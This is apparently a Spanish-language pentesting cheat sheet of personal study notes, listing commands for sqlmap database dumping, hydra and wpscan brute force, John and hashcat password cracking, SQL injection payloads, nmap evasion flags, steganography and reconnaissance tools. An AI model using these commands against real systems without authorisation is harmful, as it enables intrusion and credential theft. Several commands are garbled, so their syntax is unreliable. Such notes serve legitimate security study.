Snow:
snow -C -m “mensaje a ocultar” -p “contraseña” archivo_original.txt archivo_destino.txt
Snow -C -p “contraseña” archivo_destino.txt

Steghide:
 $ steghide embed -cf picture.jpg -ef secret.txt
 Enter passphrase:
 Re-Enter passphrase:
 embedding "secret.txt" in "picture.jpg"... done

$ steghide extract -sf picture.jpg
 Enter passphrase:
 wrote extracted data to "secret.txt".

SqlMap:
sqlmap -u “pagina” –cookie “ ”  - -dbs
sqlmap -u “pagina” –cookie “ ” -D base_de_datos --tables
sqlmap -u “pagina” –cookie “ ” -D base_de_datos -T tabla - -columns
sqlmap -u “pagina” –cookie “ ” -D base_de_datos -T tabla – C columna1,columna2 - -dump

CONTRASEÑAS:

John the Ripper
John - -list=formats
John - -format=formato –wordlist=diccionario hash
*nombre de usuario se agrega el inicio del hash separado por :   nombre:hash
John --single
ZIP: zip2john archivo.zip > hash_zip.txt
RAR:rar2john archive.rar> hash_rar.txt

Hascat
*-m se obiene con hashid -m hash = devuelve un número
hashcat -m numero_de_modo hash.txt  diccionario.txt

WpScan
wpscan - -api-token token - -ulr pagina - -plugins-detection aggressive
wpscan  - -ulr pagina --enumerate u
wpscan  - -ulr pagina --passwords archivo_password --username usuario

--enumerate :
		p-> plugin
		t-> template
		u-> usuarios

Hydra
Apt-get install libssh-dev
Cd hydra
sudo make clean
./configure
sudo make install

hydra  -l ‘usuario’ -P diccionario.txt 192.168.0.10 http-get form“/ruta/hasta/form/: username=^USER^& password=^PASS^&Login=Login:F=error:H=Cookie: pegar_cookie; security=low”

hydra -l usuario -P Word_list 10.10.10.10 ssh
Parametros:
	-s = puerto
	-t = 
	-V = verbose

SqlI
‘ Union select parametro1,parametro2 from tabla # 
*no usar # si está el parámetro en una lista
"mysql_real_escape_string()" > “valor_real or 1=1”

Desde otra página 
1' union select user, password from users#
1' union select user, password from users-- -

Nmap:
Ver SO -> nmap -O <IP/RED>
Ver hosts con puerto abierto -> nmap -p <PUERTO> <RED>
Ver versión del servicio -> nmap -sV <IP/RED>
Enumerar mediante ICMP -> nmap -sC <IP/RED>
-sn -PE pasa por FW
--script smb-os-discovery.nse -> nombre del hosts, SO
-f-> pasar FW
-g ->spoof pueto
-D
-RND
--data 0xdeadbeef
--data-string “Ph34r my l33t skills”
--randomize-hosts
--script nbstat -p 139 -> enumera netbios
--script=http-enum

Wireshark:
Spotting reflection attacks: udp.srcport == 53 or udp.srcport == 123
TCP SYN floods: tcp.flags.syn == 1 and tcp.flags.ack == 0  -> comparer tcp.flags.ack == 1 deben tener mismo n+iumero de paq.
http.request.method == POST
http contains “<PALABRAS>”
host 10.10.10.10
net 10.10.10.0/24
src  net
dst net
and, &&
or , ¡!
Not equal ne !=
Equal eq, ==
<
>
Ip.add ==
Ip.src ==
Tcp.port==,udp.port ==

Gobuster
/usr/share/wordlists/
gobuster dir -u pagina -w wordlist -e php,html
-k salta invalid configuration
gobuster dns -d mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

Dirb

Comandos
Uname -r  -> versión de Kernel

SCP
Scp nombre@10.10.10.10 :nombre_archivo_a _descargar /destino/
Scp nombre_archivo a subir nombre@10.10.10.10  /destino_servidor
Si es carpeta agregar -r
Si usa llave privada agregar -i /ruta_llave/

Nikto
nikto  -h 10.10.10.10 -o report.html
--Plugin cgi,robots,dir_transversal
-Display :
	1 show any redirect
	2 show any cookie received
	E output any error
Ping
ping 10.10.10.10 -f -l(L)1500 -> fragmenta el paquete y da un largo de 1500
-i ->ttl
-n -> echo requests

Cewl
-m -> largo mínimo de la palabra
-n -e -> n oculta las palabras, e busca los correos electrónicos
-c -> cuenta el número de palabras repetidas
--with-numbers -> genera lista alfanumérica
--auth_type: Básico.
--auth_user: Nombre de usuario de autenticación.
--auth_pass: Contraseña de autenticación.
-w -> graba en unarchivo la salida

Responder
Responder -I(i) eth0 -rdw


Varios
megaping_setup.exe
snmp-check 10.10.10.10
